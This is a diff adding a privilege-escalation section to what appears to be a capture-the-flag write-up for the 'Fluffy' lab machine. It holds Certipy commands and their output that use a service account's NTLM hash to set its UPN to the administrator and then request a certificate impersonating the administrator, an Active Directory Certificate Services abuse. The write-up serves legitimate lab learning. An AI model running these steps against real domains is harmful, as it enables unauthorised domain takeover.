@@ -554,16 +554,31 @@ Info: Establishing connection to remote endpoint
 ---
 ## Privilege Escalation
 
-### Enumeration
-
-What you found that leads to root/admin.
-
 ### Exploitation
 
-Step-by-step privilege escalation.
-
 ```shell
-# Commands used
+certipy-ad account update -u ca_svc@fluffy.htb -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -user ca_svc -upn administrator@fluffy.htb -dc-ip 10.129.131.175 -dc-host DC01.fluffy.htb
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Updating user 'ca_svc':
+    userPrincipalName                   : administrator@fluffy.htb
+[*] Successfully updated 'ca_svc'
+
+```
+
+```
+certipy-ad req -u ca_svc@fluffy.htb -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.131.175 -dc-host DC01.fluffy.htb -ca fluffy-DC01-CA -template User
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 22
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator@fluffy.htb'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+
 ```
 
 ---
